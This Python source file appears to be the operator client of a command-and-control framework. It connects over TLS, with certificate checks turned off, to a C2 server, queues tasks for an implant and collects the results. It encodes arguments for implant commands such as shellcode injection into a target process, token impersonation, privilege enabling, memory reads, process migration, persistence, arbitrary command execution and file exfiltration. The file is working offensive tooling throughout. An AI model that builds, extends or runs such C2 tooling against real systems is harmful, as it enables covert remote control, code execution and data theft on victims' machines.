import os
import socket
import ssl
import struct
import sys

from commands import CMD_NAMES
from protocol import (
    DEFAULT_AGENT_ID,
    MSG_OPERATOR_GET_RESULT,
    MSG_OPERATOR_LIST_HISTORY,
    MSG_OPERATOR_LIST_PENDING,
    MSG_OPERATOR_SUBMIT_TASK,
    MSG_SERVER_ACK,
    MSG_SERVER_PENDING,
    MSG_SERVER_RESULT,
    MSG_SERVER_TASK_HISTORY,
    MSG_SERVER_TASK_LIST,
    TASK_STATE_COMPLETED_CODE,
    TASK_STATE_LEASED_CODE,
    TASK_STATE_QUEUED_CODE,
    recv_http_response_tlv,
    send_http_request,
)
if len(sys.argv) < 3:
	sys.exit("usage: <C2 HOST IP> <C2 PORT>")

try: 
	C2_HOST = sys.argv[1]#"127.0.0.1"
	C2_PORT = int(sys.argv[2])#9002

except ValueError:
	sys.exit("Error: Invalid C2 Port")

TASK_STATE_NAMES = {
    TASK_STATE_QUEUED_CODE:    "queued",
    TASK_STATE_LEASED_CODE:    "leased",
    TASK_STATE_COMPLETED_CODE: "completed",
}

PENDING_TASK_ENTRY_SIZE = 16
TASK_HISTORY_ENTRY_SIZE = 20
RESULT_HEADER_SIZE      = 16

# Maps task_id -> local save path for download results.
_DOWNLOAD_PATHS: dict = {}


def encode_arg_bytes(cmd_name: str, arg: str) -> bytes:
    """
    Convert operator input into the binary argument format expected by the
    implant command handler.

    Argument conventions (must match the C handler's parsing):
      impersonate-token <pid>                → DWORD pid (LE)
      enable-privilege / disable-privilege   → UTF-8 privilege name
      ls / cat / mkdir / rm / download       → UTF-8 remote path
      upload <remote_path> <local_path>      → DWORD path_len + path_utf8 + file_bytes
      ps / getpid / env / kill / persist /
        unpersist / inspect-token / hostname /
        whoami                               → (empty)
      exec <command>                         → UTF-8 command string
      shellcodeexec <pid> <shellcode_file>   → DWORD pid + raw shellcode bytes
      memread <pid> <addr_hex> <size>        → DWORD pid + UINT64 addr + DWORD size
      modulelist / handlelist / migrate <pid>→ DWORD pid (LE)
      get-env <name>                          → UTF-8 name
      set-env <NAME=VALUE>                    → UTF-8 "NAME=VALUE"
      sleep <ms>                             → DWORD milliseconds (LE)
    """
    # PID-only commands
    if cmd_name in {"impersonate-token", "module-list", "handle-list", "migrate"}:
        return struct.pack("<I", int(arg, 10))

    # Privilege name
    if cmd_name in {"enable-privilege", "disable-privilege"}:
        return arg.encode("utf-8")

    # Simple path (UTF-8)
    if cmd_name in {"ls", "cat", "mkdir", "rm", "download", "get-env"}:
        return arg.encode("utf-8")

    # Environment variable set: "NAME=VALUE"
    if cmd_name == "set-env":
        return arg.encode("utf-8")

    # Sleep: milliseconds as DWORD
    if cmd_name == "sleep":
        return struct.pack("<I", int(arg, 10))

    # Upload: "remote_path local_path"
    if cmd_name == "upload":
        parts = arg.split(None, 1)
        if len(parts) != 2:
            raise ValueError("upload requires: <remote_path> <local_path>")
        remote_path, local_path = parts
        path_bytes = remote_path.encode("utf-8")
        with open(local_path, "rb") as fh:
            file_data = fh.read()
        return struct.pack("<I", len(path_bytes)) + path_bytes + file_data

    # Exec: shell command string
    if cmd_name == "exec":
        return arg.encode("utf-8")

    # Shellcodeexec: "pid shellcode_file"
    if cmd_name == "shellcode-exec":
        parts = arg.split(None, 1)
        if len(parts) != 2:
            raise ValueError("shellcode-exec requires: <pid> <shellcode_file>")
        pid_val = int(parts[0], 10)
        with open(parts[1], "rb") as fh:
            shellcode = fh.read()
        return struct.pack("<I", pid_val) + shellcode

    # Memread: "pid address_hex size"
    if cmd_name == "mem-read":
        parts = arg.split()
        if len(parts) != 3:
            raise ValueError("memread requires: <pid> <address_hex> <size>")
        pid_val  = int(parts[0], 10)
        addr_val = int(parts[1], 16)
        size_val = int(parts[2], 10)
        return struct.pack("<I", pid_val) + struct.pack("<Q", addr_val) + struct.pack("<I", size_val)

    # No-argument commands
    if cmd_name in {"ps", "getpid", "env", "kill", "persist", "unpersist",
                    "inspect-token", "hostname", "whoami"}:
        return b""

    return b""


def _build_tls_context():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname  = False
    ctx.verify_mode     = ssl.CERT_NONE
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    return ctx


_TLS_CTX = _build_tls_context()


def send_message(message_type, payload):
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        raw.connect((C2_HOST, C2_PORT))
        conn = _TLS_CTX.wrap_socket(raw, server_hostname=C2_HOST)
        send_http_request(conn, C2_HOST, message_type, payload)
        return recv_http_response_tlv(conn)
    except OSError:
        return None
    finally:
        raw.close()


def submit_task(command_id, arg_bytes):
    payload = struct.pack("<III", DEFAULT_AGENT_ID, command_id, len(arg_bytes)) + arg_bytes
    return send_message(MSG_OPERATOR_SUBMIT_TASK, payload)


def fetch_result(task_id):
    return send_message(MSG_OPERATOR_GET_RESULT, struct.pack("<I", task_id))


def fetch_pending_tasks():
    return send_message(MSG_OPERATOR_LIST_PENDING, b"")


def fetch_task_history():
    return send_message(MSG_OPERATOR_LIST_HISTORY, b"")


def display_pending_tasks():
    response = fetch_pending_tasks()
    if response is None:
        print("[!] Failed to query pending tasks")
        return

    response_type, payload = response
    if response_type != MSG_SERVER_TASK_LIST or len(payload) < 4:
        print("[!] Unexpected response while querying pending tasks")
        return

    task_count      = struct.unpack("<I", payload[:4])[0]
    expected_length = 4 + (task_count * PENDING_TASK_ENTRY_SIZE)
    if len(payload) < expected_length:
        print("[!] Pending task list payload is truncated")
        return

    if task_count == 0:
        print("[*] No queued or leased tasks.")
        return

    print("\nPending tasks:")
    print("  task_id  agent_id  command                     state")

    offset = 4
    for _ in range(task_count):
        task_id, agent_id, command_id, state_code = struct.unpack(
            "<IIII", payload[offset:offset + PENDING_TASK_ENTRY_SIZE]
        )
        offset      += PENDING_TASK_ENTRY_SIZE
        command_name = CMD_NAMES.get(command_id, f"0x{command_id:08X}")
        state_name   = TASK_STATE_NAMES.get(state_code, f"unknown({state_code})")
        print(f"  {task_id:<7}  {agent_id:<8}  {command_name:<26} {state_name}")


def display_task_history():
    response = fetch_task_history()
    if response is None:
        print("[!] Failed to query task history")
        return

    response_type, payload = response
    if response_type != MSG_SERVER_TASK_HISTORY or len(payload) < 4:
        print("[!] Unexpected response while querying task history")
        return

    task_count      = struct.unpack("<I", payload[:4])[0]
    expected_length = 4 + (task_count * TASK_HISTORY_ENTRY_SIZE)
    if len(payload) < expected_length:
        print("[!] Task history payload is truncated")
        return

    if task_count == 0:
        print("[*] No task history available.")
        return

    print("\nTask history:")
    print("  task_id  agent_id  command                     state       status")

    offset = 4
    for _ in range(task_count):
        task_id, agent_id, command_id, state_code, status = struct.unpack(
            "<IIIII", payload[offset:offset + TASK_HISTORY_ENTRY_SIZE]
        )
        offset      += TASK_HISTORY_ENTRY_SIZE
        command_name = CMD_NAMES.get(command_id, f"0x{command_id:08X}")
        state_name   = TASK_STATE_NAMES.get(state_code, f"unknown({state_code})")
        print(f"  {task_id:<7}  {agent_id:<8}  {command_name:<26} {state_name:<10} 0x{status:08X}")


def check_task_result(display_result, task_id):
    result = fetch_result(task_id)
    if result is None:
        print("[!] Failed to query task result")
        return

    result_type, result_payload = result
    if result_type == MSG_SERVER_PENDING:
        print(f"[*] Task {task_id} is still pending.")
        return

    if result_type != MSG_SERVER_RESULT or len(result_payload) < RESULT_HEADER_SIZE:
        print("[!] Unexpected result response")
        return

    result_task_id, result_command_id, status, result_length = struct.unpack(
        "<IIII", result_payload[:RESULT_HEADER_SIZE]
    )
    result_bytes = result_payload[RESULT_HEADER_SIZE:RESULT_HEADER_SIZE + result_length]
    print(f"[*] Task {result_task_id} completed")
    display_result(result_command_id, status, result_bytes)


def print_queue_result(response):
    if response is None:
        print("[!] Failed to submit task")
        return

    response_type, payload = response
    if response_type != MSG_SERVER_ACK or len(payload) < 4:
        print("[!] Unexpected response while submitting task")
        return

    task_id = struct.unpack("<I", payload[:4])[0]
    print(f"[*] Queued task {task_id} for agent {DEFAULT_AGENT_ID}  "
          f"(use 'check {task_id}' to retrieve the result)")
    return task_id


def register_download_path(task_id: int, save_path: str) -> None:
    """Remember where to save the result for a download task."""
    _DOWNLOAD_PATHS[task_id] = save_path


def pop_download_path(task_id: int):
    """Return and remove the saved path for a download task."""
    return _DOWNLOAD_PATHS.pop(task_id, None)
